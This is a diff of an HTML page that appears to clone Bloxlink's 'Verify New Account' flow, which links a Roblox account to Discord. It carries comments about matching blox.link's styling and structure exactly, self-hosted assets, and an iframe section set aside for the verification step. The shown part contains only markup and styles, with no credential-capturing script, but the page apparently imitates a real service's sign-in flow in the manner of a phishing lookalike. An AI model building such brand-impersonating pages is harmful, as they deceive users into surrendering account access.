@@ -3,76 +3,54 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Verify New Account | Bloxlink</title>
+  <title>User Dashboard | Bloxlink</title>
   <link rel="icon" href="https://blox.link/brand/favicon/favicon-32x32.png?v=693egPWNnr" type="image/png" sizes="32x32">
   <link rel="stylesheet" href="/dashboard/verify/verify.css">
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
   <style>
     html { font-family: 'Poppins', ui-sans-serif, system-ui, sans-serif; }
     body { margin: 0; background: rgb(25,33,48); color: #fff; }
 
-    :root {
-      --color-primary-background: rgb(25,33,48);
-      --color-secondary-background: rgb(31,41,55);
-      --color-tertiary-background: rgb(41,51,65);
-    }
-
+    /* Exact custom property definitions matching blox.link */
+    .bg-primary-background   { background-color: rgb(25,33,48) !important; }
+    .bg-secondary-background { background-color: rgb(31,41,55) !important; }
+    .bg-tertiary-background  { background-color: rgb(41,51,65) !important; }
+    .text-primary-text   { color: #fff !important; }
+    .text-secondary-text { color: rgb(156,163,175) !important; }
+    .border-b-tertiary-background { border-bottom-color: rgb(41,51,65) !important; }
+    .divide-tertiary-background > :not([hidden]) ~ :not([hidden]) { border-color: rgb(41,51,65); }
+    .border-success { border-color: rgb(16,185,129) !important; }
+    .hover\:bg-tertiary-background:hover { background-color: rgb(41,51,65) !important; }
+    .overflow-y-overlay { overflow-y: auto; }
     .scrollbar-custom::-webkit-scrollbar { width: 4px; }
     .scrollbar-custom::-webkit-scrollbar-track { background: transparent; }
     .scrollbar-custom::-webkit-scrollbar-thumb { background: rgb(55,65,81); border-radius: 4px; }
 
-    .bg-primary-background   { background-color: rgb(25,33,48); }
-    .bg-secondary-background { background-color: rgb(31,41,55); }
-    .bg-tertiary-background  { background-color: rgb(41,51,65); }
-    .text-primary-text   { color: #fff; }
-    .text-secondary-text { color: rgb(156,163,175); }
-    .border-tertiary-background { border-color: rgb(41,51,65); }
-    .divide-tertiary-background > :not([hidden]) ~ :not([hidden]) { border-color: rgb(41,51,65); }
-    .hover\:bg-secondary-background\/60:hover { background-color: rgba(31,41,55,0.6); }
-
-    /* Step progress bar */
-    .step-active   { background: #4f46e5; color: #fff; }
-    .step-inactive { background: transparent; color: rgb(156,163,175); }
-    .step-circle-active   { border-color: #4f46e5; background: #4f46e5; color: #fff; }
-    .step-circle-inactive { border-color: rgb(55,65,81); background: transparent; color: rgb(156,163,175); }
-
-    /* Verify method card */
-    .method-card {
-      border: 2px solid transparent;
-      border-radius: 6px;
-      padding: 16px 20px;
-      cursor: pointer;
-      transition: border-color .15s;
-      background: transparent;
-    }
-    .method-card.selected { border-color: #22c55e; }
-    .method-card:hover:not(.selected) { border-color: rgb(55,65,81); }
-
-    /* Iframe overlay for step 2 */
-    #verifyIframeWrap { display: none; }
-    #verifyIframe { width: 100%; height: calc(100vh - 180px); min-height: 520px; border: none; }
-
-    /* Spinner */
-    .spinner {
-      width: 32px; height: 32px;
-      border: 3px solid rgba(255,255,255,0.15);
-      border-top-color: #fff;
-      border-radius: 50%;
-      animation: spin .8s linear infinite;
-      margin: 0 auto;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-
-    /* Nav chip dropdown */
+    /* Nav chip dropdown (pops upward) */
     #navDropdown {
-      opacity: 0; visibility: hidden; transform: translateY(8px);
-      transition: opacity .15s ease, transform .15s ease, visibility .15s;
-      position: absolute; bottom: 100%; margin-bottom: 4px; left: 0; right: 0;
-      background: rgb(31,41,55); border: 1px solid rgb(55,65,81);
-      border-radius: 6px; overflow: hidden; z-index: 50;
+      position: absolute;
+      bottom: 100%;
+      margin-bottom: 4px;
+      left: 0; right: 0;
+      background: rgb(31,41,55);
+      border: 1px solid rgb(55,65,81);
+      border-radius: 6px;
+      overflow: hidden;
+      z-index: 50;
       box-shadow: 0 -4px 24px rgba(0,0,0,.4);
+      display: none;
     }
-    #navDropdown.open { opacity:1; visibility:visible; transform:translateY(0); }
+    #navDropdown.open { display: block; }
+
+    /* Iframe */
+    #iframeSection { display: none; }
+    #verifyIframe {
+      width: 100%;
+      height: calc(100vh - 140px);
+      min-height: 480px;
+      border: none;
+      display: block;
+    }
   </style>
 </head>
 <body class="bg-primary-background">
@@ -82,36 +60,36 @@
   <!-- Mobile header -->
   <div class="md:hidden flex items-center border-b border-gray-700 bg-primary-background p-2 text-primary-text space-x-2 w-screen">
     <button id="mobileMenuBtn" class="p-2 rounded-md transition-colors hover:bg-gray-700">
+      <span class="sr-only">Open sidebar</span>
       <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-7 h-7">
         <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"/>
       </svg>
     </button>
-    <a class="flex items-center" href="/">
+    <a class="flex items-center relative" href="/">
       <img src="/assets/wordmark.svg" alt="Bloxlink" width="96" height="28" onerror="this.src='https://blox.link/wordmark.svg'">
     </a>
   </div>
 
   <!-- Sidebar -->
-  <div id="sidebar" class="transition-all duration-150 ease-out z-20 h-screen fixed md:relative bg-transparent invisible md:bg-primary-background md:visible">
+  <div class="transition-all duration-150 ease-out z-20 h-screen fixed md:relative bg-transparent invisible md:bg-primary-background md:visible">
     <div id="sidebarInner" class="flex flex-col border-r border-gray-700 w-[min(100vw,_16rem)] h-screen absolute md:relative transition-all left-[-16rem] md:left-0">
-      <div class="flex flex-col pt-5 bg-gray-900 overflow-y-auto scrollbar-custom w-full flex-grow">
+      <div class="flex flex-col pt-5 bg-gray-900 overflow-y-auto overflow-y-overlay scrollbar-custom w-full flex-grow">
 
         <div class="flex md:hidden px-5 pb-2">
           <button id="closeSidebarBtn" class="p-1.5 rounded-md transition-colors hover:bg-gray-700 text-primary-text">
+            <span class="sr-only">Close sidebar</span>
             <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-7 h-7">
               <path stroke-linecap="round" stroke-linejoin="round" d="M6 18 18 6M6 6l12 12"/>
             </svg>
           </button>
         </div>
 
-        <!-- Logo -->
         <div class="hidden md:flex justify-center">
           <a class="relative w-48 h-24" href="/">
             <img src="/assets/wordmark.svg" alt="Bloxlink" onerror="this.src='https://blox.link/wordmark.svg'">
           </a>
         </div>
 
-        <!-- Nav -->
         <div class="h-full flex-1 flex flex-col px-3 mb-4 space-y-4">
           <div class="flex flex-col justify-between h-full">
             <div class="flex flex-col gap-4">
@@ -119,20 +97,20 @@
               <div class="space-y-1">
                 <div class="text-xs uppercase font-semibold text-primary-text">General</div>
                 <div class="space-y-1">
-                  <a href="/dashboard">
-                    <div class="bg-gray-900 text-gray-400 hover:text-primary-text transition-colors group flex items-center pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer">
-                      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="mr-3 h-6 w-6">
-                        <path stroke-linecap="round" stroke-linejoin="round" d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z"/>
-                      </svg>
-                      Verifications
+                  <a target="_self" href="/dashboard">
+                    <div class="bg-gray-900 text-gray-400 hover:text-primary-text transition-colors group flex items-center justify-between pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer">
+                      <div class="flex items-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="text-gray-400 group-hover:text-primary-text transition-colors mr-3 h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z"/></svg>
+                        <span>Verifications</span>
+                      </div>
                     </div>
                   </a>
-                  <a href="#">
-                    <div class="bg-gray-900 text-gray-400 hover:text-primary-text transition-colors group flex items-center pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer">
-                      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="mr-3 h-6 w-6">
-                        <path stroke-linecap="round" stroke-linejoin="round" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 0v3.75m-16.5-3.75v3.75m16.5 0v3.75C20.25 16.153 16.556 18 12 18s-8.25-1.847-8.25-4.125v-3.75m16.5 0c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125"/>
-                      </svg>
-                      Manage Servers
+                  <a target="_self" href="#">
+                    <div class="bg-gray-900 text-gray-400 hover:text-primary-text transition-colors group flex items-center justify-between pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer">
+                      <div class="flex items-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="text-gray-400 group-hover:text-primary-text transition-colors mr-3 h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 0v3.75m-16.5-3.75v3.75m16.5 0v3.75C20.25 16.153 16.556 18 12 18s-8.25-1.847-8.25-4.125v-3.75m16.5 0c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125"/></svg>
+                        <span>Manage Servers</span>
+                      </div>
                     </div>
                   </a>
                 </div>
@@ -141,40 +119,44 @@
               <div class="space-y-1">
                 <div class="text-xs uppercase font-semibold text-primary-text">Account</div>
                 <div class="space-y-1">
-                  <a href="#"><div class="bg-gray-900 text-gray-400 hover:text-primary-text transition-colors group flex items-center pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="mr-3 h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M13.19 8.688a4.5 4.5 0 0 1 1.242 7.244l-4.5 4.5a4.5 4.5 0 0 1-6.364-6.364l1.757-1.757m13.35-.622 1.757-1.757a4.5 4.5 0 0 0-6.364-6.364l-4.5 4.5a4.5 4.5 0 0 0 1.242 7.244"/></svg>Manage Subscriptions</div></a>
-                  <a href="#"><div class="bg-gray-900 text-gray-400 hover:text-primary-text transition-colors group flex items-center pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="mr-3 h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M4.5 12a7.5 7.5 0 0 0 15 0m-15 0a7.5 7.5 0 1 1 15 0m-15 0H3m16.5 0H21m-1.5 0H12m-8.457 3.077 1.41-.513m14.095-5.13 1.41-.513M5.106 17.785l1.15-.964m11.49-9.642 1.149-.964M7.501 19.795l.75-1.3m7.5-12.99.75-1.3m-6.063 16.658.26-1.477m2.605-14.772.26-1.477m0 17.726-.26-1.477M10.698 4.614l-.26-1.477M16.5 19.794l-.75-1.299M7.5 4.205 12 12m6.894 5.785-1.149-.964M6.256 7.178l-1.15-.964m15.352 8.864-1.41-.513M4.954 9.435l-1.41-.514M12.002 12l-3.75 6.495"/></svg>Settings</div></a>
+                  <a target="_self" href="#"><div class="bg-gray-900 text-gray-400 hover:text-primary-text transition-colors group flex items-center justify-between pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer"><div class="flex items-center"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="text-gray-400 group-hover:text-primary-text transition-colors mr-3 h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M13.19 8.688a4.5 4.5 0 0 1 1.242 7.244l-4.5 4.5a4.5 4.5 0 0 1-6.364-6.364l1.757-1.757m13.35-.622 1.757-1.757a4.5 4.5 0 0 0-6.364-6.364l-4.5 4.5a4.5 4.5 0 0 0 1.242 7.244"/></svg><span>Manage Subscriptions</span></div></div></a>
+                  <a target="_self" href="#"><div class="bg-gray-900 text-gray-400 hover:text-primary-text transition-colors group flex items-center justify-between pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer"><div class="flex items-center"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="text-gray-400 group-hover:text-primary-text transition-colors mr-3 h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M4.5 12a7.5 7.5 0 0 0 15 0m-15 0a7.5 7.5 0 1 1 15 0m-15 0H3m16.5 0H21m-1.5 0H12m-8.457 3.077 1.41-.513m14.095-5.13 1.41-.513M5.106 17.785l1.15-.964m11.49-9.642 1.149-.964M7.501 19.795l.75-1.3m7.5-12.99.75-1.3m-6.063 16.658.26-1.477m2.605-14.772.26-1.477m0 17.726-.26-1.477M10.698 4.614l-.26-1.477M16.5 19.794l-.75-1.299M7.5 4.205 12 12m6.894 5.785-1.149-.964M6.256 7.178l-1.15-.964m15.352 8.864-1.41-.513M4.954 9.435l-1.41-.514M12.002 12l-3.75 6.495"/></svg><span>Settings</span></div></div></a>
                 </div>
               </div>
 
               <div class="space-y-1">
                 <div class="text-xs uppercase font-semibold text-primary-text">Other</div>
                 <div class="space-y-1">
-                  <a href="https://discord.gg/bloxlink"><div class="bg-gray-900 text-gray-400 hover:text-primary-text transition-colors group flex items-center pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="mr-3 h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M9.879 7.519c1.171-1.025 3.071-1.025 4.242 0 1.172 1.025 1.172 2.687 0 3.712-.203.179-.43.326-.67.442-.745.361-1.45.999-1.45 1.827v.75M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9 5.25h.008v.008H12v-.008Z"/></svg>Support</div></a>
-                  <a href="#"><div class="bg-gray-900 text-gray-400 hover:text-primary-text transition-colors group flex items-center pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="mr-3 h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5"/></svg>Developer API</div></a>
+                  <a target="_self" href="https://discord.gg/bloxlink"><div class="bg-gray-900 text-gray-400 hover:text-primary-text transition-colors group flex items-center justify-between pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer"><div class="flex items-center"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="text-gray-400 group-hover:text-primary-text transition-colors mr-3 h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M9.879 7.519c1.171-1.025 3.071-1.025 4.242 0 1.172 1.025 1.172 2.687 0 3.712-.203.179-.43.326-.67.442-.745.361-1.45.999-1.45 1.827v.75M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9 5.25h.008v.008H12v-.008Z"/></svg><span>Support</span></div></div></a>
+                  <a target="_self" href="#"><div class="bg-gray-900 text-gray-400 hover:text-primary-text transition-colors group flex items-center justify-between pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer"><div class="flex items-center"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="text-gray-400 group-hover:text-primary-text transition-colors mr-3 h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5"/></svg><span>Developer API</span></div></div></a>
                 </div>
               </div>
             </div>
 
-            <!-- User chip + dropdown -->
+            <!-- User chip + dropdown (pops upward) -->
             <div class="flex flex-col space-y-2 relative mt-4">
               <div id="navDropdown">
-                <div class="divide-y divide-tertiary-background">
-                  <a class="flex items-center text-white text-sm space-x-2 bg-secondary-background hover:bg-tertiary-background px-2 py-2 cursor-pointer rounded-t-md" href="/dashboard">
-                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 0 0 3 8.25v10.5A2.25 2.25 0 0 0 5.25 21h10.5A2.25 2.25 0 0 0 18 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"/></svg>
-                    <span>Dashboard</span>
+                <div>
+                  <a class="flex items-center text-white text-sm space-x-2 bg-secondary-background hover:bg-tertiary-background px-2 py-2 cursor-pointer rounded-t-md" href="https://discord.gg/bloxlink" target="_blank" rel="noreferrer">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-7 h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 0 0 3 8.25v10.5A2.25 2.25 0 0 0 5.25 21h10.5A2.25 2.25 0 0 0 18 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"/></svg>
+                    <span>Support Server</span>
                   </a>
-                  <a id="navLogoutBtn" href="#" class="flex items-center text-red-400 text-sm space-x-2 bg-secondary-background hover:bg-tertiary-background px-2 py-2 cursor-pointer rounded-b-md">
-                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M15.75 9V5.25A2.25 2.25 0 0 0 13.5 3h-6a2.25 2.25 0 0 0-2.25 2.25v13.5A2.25 2.25 0 0 0 7.5 21h6a2.25 2.25 0 0 0 2.25-2.25V15M12 9l-3 3m0 0 3 3m-3-3h12.75"/></svg>
-                    <span>Log out</span>
+                  <a class="flex items-center text-white text-sm space-x-2 bg-secondary-background hover:bg-tertiary-background px-2 py-2 cursor-pointer" href="#">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-7 h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M4.5 12a7.5 7.5 0 0 0 15 0m-15 0a7.5 7.5 0 1 1 15 0m-15 0H3m16.5 0H21m-1.5 0H12m-8.457 3.077 1.41-.513m14.095-5.13 1.41-.513M5.106 17.785l1.15-.964m11.49-9.642 1.149-.964M7.501 19.795l.75-1.3m7.5-12.99.75-1.3m-6.063 16.658.26-1.477m2.605-14.772.26-1.477m0 17.726-.26-1.477M10.698 4.614l-.26-1.477M16.5 19.794l-.75-1.299M7.5 4.205 12 12m6.894 5.785-1.149-.964M6.256 7.178l-1.15-.964m15.352 8.864-1.41-.513M4.954 9.435l-1.41-.514M12.002 12l-3.75 6.495"/></svg>
+                    <span>Settings</span>
                   </a>
                 </div>
+                <a id="navLogoutBtn" href="#" class="flex items-center text-red-400 text-sm space-x-2 bg-secondary-background hover:bg-tertiary-background px-2 py-2 cursor-pointer rounded-b-md">
+                  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-7 h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M15.75 9V5.25A2.25 2.25 0 0 0 13.5 3h-6a2.25 2.25 0 0 0-2.25 2.25v13.5A2.25 2.25 0 0 0 7.5 21h6a2.25 2.25 0 0 0 2.25-2.25V15M12 9l-3 3m0 0 3 3m-3-3h12.75"/></svg>
+                  <span>Log out</span>
+                </a>
               </div>
-              <div id="navChip" class="rounded-md cursor-pointer px-2 py-2 font-medium select-none text-white hover:bg-secondary-background flex items-center justify-between">
+              <div id="navChip" class="rounded-md cursor-pointer px-2 py-2 text-md font-medium select-none text-white hover:bg-secondary-background flex items-center justify-between">
                 <div class="flex items-center space-x-2">
-                  <img id="navAvatar" src="/assets/avatar.png" alt="avatar" width="28" height="28" class="rounded-full object-cover">
-                  <span id="navUsername" class="text-sm">Loading...</span>
+                  <img id="navAvatar" src="/assets/avatar.png" alt="User avatar" width="28" height="28" class="rounded-full">
+                  <span id="navUsername" class="mt-1">Loading...</span>
                 </div>
-                <svg class="nav-chevron w-4 h-4 transition-transform duration-200" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-4 h-4">
                   <path stroke-linecap="round" stroke-linejoin="round" d="m4.5 15.75 7.5-7.5 7.5 7.5"/>
                 </svg>
               </div>
@@ -187,104 +169,96 @@
   </div>
 
   <!-- Main Content -->
-  <div class="bg-secondary-background h-screen w-full overflow-y-auto">
+  <div class="bg-secondary-background h-screen w-full 2xl:flex-1 overflow-y-auto">
 
-    <!-- Top Banner -->
-    <div style="background:rgba(99,102,241,0.1); border-bottom:1px solid rgba(99,102,241,0.2);" class="flex items-center gap-2 justify-center px-4 py-2">
-      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-4 h-4 text-white flex-shrink-0">
+    <!-- Banner (exact match from original) -->
+    <div id="banner" class="rounded-md px-3 py-2 flex items-center gap-2 bg-indigo-400/10 justify-center">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6 text-white">
         <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m9-.75a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9 3.75h.008v.008H12v-.008Z"/>
       </svg>
-      <div class="text-sm" style="color:rgb(209,213,219);">
-        We've updated our <a class="text-blue-400 hover:underline" href="https://blox.link/legal/terms-of-service">Terms of Service</a>,
-        <a class="text-blue-400 hover:underline" href="https://blox.link/legal/privacy-policy">Privacy Policy</a>, and
-        <a class="text-blue-400 hover:underline" href="https://blox.link/legal/purchase-policy">Purchase Policy</a> effective February 10, 2026.
+      <div class="text-sm text-gray-300">
+        <span>We've updated our <a class="text-blue-400 hover:underline" href="https://blox.link/legal/terms-of-service">Terms of Service</a>, <a class="text-blue-400 hover:underline" href="https://blox.link/legal/privacy-policy">Privacy Policy</a>, and <a class="text-blue-400 hover:underline" href="https://blox.link/legal/purchase-policy">Purchase Policy</a> effective February 10, 2026.</span>
       </div>
     </div>
 
-    <!-- Page header -->
-    <div class="px-8 py-4 space-x-4 border-b text-sm" style="border-color:rgb(41,51,65);">
-      <span class="text-primary-text font-bold">Verify New Account</span>
-      <span class="text-secondary-text">Link a new Roblox account to Discord.</span>
-    </div>
+    <div translate="no" class="notranslate">
+      <div class="flex flex-col gap-8 mb-8">
 
-    <!-- Step 1 content -->
-    <div id="step1View" class="px-8 mt-8">
+        <!-- Page header -->
+        <div class="px-8 py-4 space-x-4 border-b-tertiary-background border-b text-sm">
+          <span class="text-primary-text font-bold">Verify New Account</span>
+          <span class="text-secondary-text">Link a new Roblox account to Discord.</span>
+        </div>
 
-      <!-- 4-step progress -->
-      <div class="flex items-center gap-6 mb-10 flex-wrap">
-        <!-- Step 1 active -->
-        <div class="flex items-center gap-2 bg-indigo-600 rounded-md px-4 py-2.5">
-          <div class="w-6 h-6 rounded-full border-2 border-white flex items-center justify-center text-xs font-bold text-white flex-shrink-0">1</div>
-          <span class="text-sm font-semibold text-white">Account Information</span>
-        </div>
-        <!-- Step 2 inactive -->
-        <div class="flex items-center gap-2">
-          <div class="w-6 h-6 rounded-full border-2 flex items-center justify-center text-xs font-bold flex-shrink-0" style="border-color:rgb(55,65,81);color:rgb(156,163,175);">2</div>
-          <span class="text-sm" style="color:rgb(156,163,175);">Account Verification</span>
-        </div>
-        <!-- Step 3 inactive -->
-        <div class="flex items-center gap-2">
-          <div class="w-6 h-6 rounded-full border-2 flex items-center justify-center text-xs font-bold flex-shrink-0" style="border-color:rgb(55,65,81);color:rgb(156,163,175);">3</div>
-          <span class="text-sm" style="color:rgb(156,163,175);">Select Servers</span>
-        </div>
-        <!-- Step 4 inactive -->
-        <div class="flex items-center gap-2">
-          <div class="w-6 h-6 rounded-full border-2 flex items-center justify-center text-xs font-bold flex-shrink-0" style="border-color:rgb(55,65,81);color:rgb(156,163,175);">4</div>
-          <span class="text-sm" style="color:rgb(156,163,175);">Finished</span>
-        </div>
-      </div>
+        <!-- Step 1 content -->
+        <div id="step1Section" class="flex flex-col gap-6 px-8">
 
-      <!-- New Account Information -->
-      <h2 class="text-xl font-bold text-primary-text mb-1">New Account Information</h2>
-      <p class="text-secondary-text text-sm mb-5">Select Verification Method.</p>
+          <!-- Steps card — exact blox.link structure -->
+          <div class="relative bg-primary-background shadow-md p-6 rounded-lg">
+            <div class="flex flex-col xl:flex-row">
+              <!-- Step 1 active -->
+              <div class="flex gap-4 items-center flex-1 rounded-md p-4 bg-indigo-600">
+                <div class="border-2 rounded-full h-8 w-8 justify-center items-center flex border-white">
+                  <p class="text-base font-normal text-primary-text text-left">1</p>
+                </div>
+                <p class="text-base font-normal text-primary-text text-left">Account Information</p>
+              </div>
+              <!-- Step 2 inactive -->
+              <div class="flex gap-4 items-center flex-1 rounded-md p-4">
+                <div class="border-2 rounded-full h-8 w-8 justify-center items-center flex border-white">
+                  <p class="text-base font-normal text-primary-text text-left">2</p>
+                </div>
+                <p class="text-base font-normal text-primary-text text-left">Account Verification</p>
+              </div>
+              <!-- Step 3 inactive -->
+              <div class="flex gap-4 items-center flex-1 rounded-md p-4">
+                <div class="border-2 rounded-full h-8 w-8 justify-center items-center flex border-white">
+                  <p class="text-base font-normal text-primary-text text-left">3</p>
+                </div>
+                <p class="text-base font-normal text-primary-text text-left">Select Servers</p>
+              </div>
+              <!-- Step 4 inactive -->
+              <div class="flex gap-4 items-center flex-1 rounded-md p-4">
+                <div class="border-2 rounded-full h-8 w-8 justify-center items-center flex border-white">
+                  <p class="text-base font-normal text-primary-text text-left">4</p>
+                </div>
+                <p class="text-base font-normal text-primary-text text-left">Finished</p>
+              </div>
+            </div>
+          </div>
 
-      <!-- Method card -->
-      <div class="method-card selected border-green-500" id="methodCard" style="border: 2px solid #22c55e; background: rgb(25,33,48); padding: 16px 20px; border-radius: 6px; cursor: pointer; max-width: 860px;">
-        <p class="text-white font-semibold text-base mb-0.5">Authorize Roblox</p>
-        <p class="text-sm" style="color:#4ade80;">Link your Roblox account with Bloxlink in one <span style="text-decoration:underline;cursor:pointer;">click</span>.</p>
-      </div>
-
-      <!-- Next button -->
-      <button id="nextBtn" class="mt-6 w-full max-w-[860px] bg-indigo-600 hover:bg-indigo-700 text-white font-semibold py-3 rounded-md transition-colors text-sm">
-        Next
-      </button>
-    </div>
-
-    <!-- Step 2: loading + iframe -->
-    <div id="step2View" style="display:none;" class="px-8 mt-8">
-      <!-- Progress (step 2 active) -->
-      <div class="grid grid-cols-4 gap-2 mb-8">
-        <div class="step-inactive rounded-md flex items-center gap-3 px-4 py-3">
-          <div class="w-7 h-7 rounded-full border-2 step-circle-inactive flex items-center justify-center text-sm font-bold flex-shrink-0">1</div>
-          <span class="text-sm">Account Information</span>
+          <!-- Method card -->
+          <div class="relative bg-primary-background shadow-md p-6 rounded-lg">
+            <div class="flex flex-col gap-6">
+              <div class="flex flex-col">
+                <p class="text-lg font-bold text-primary-text text-left">New Account Information</p>
+                <p class="text-sm font-normal text-secondary-text text-left">Select Verification Method.</p>
+              </div>
+              <div class="flex flex-col gap-2">
+                <!-- Authorize Roblox option -->
+                <div class="relative bg-secondary-background shadow-sm cursor-pointer hover:shadow-lg hover:opacity-90 p-4 rounded-md border-2 border-success">
+                  <div class="flex flex-col">
+                    <p class="text-base font-normal text-primary-text text-left">Authorize Roblox</p>
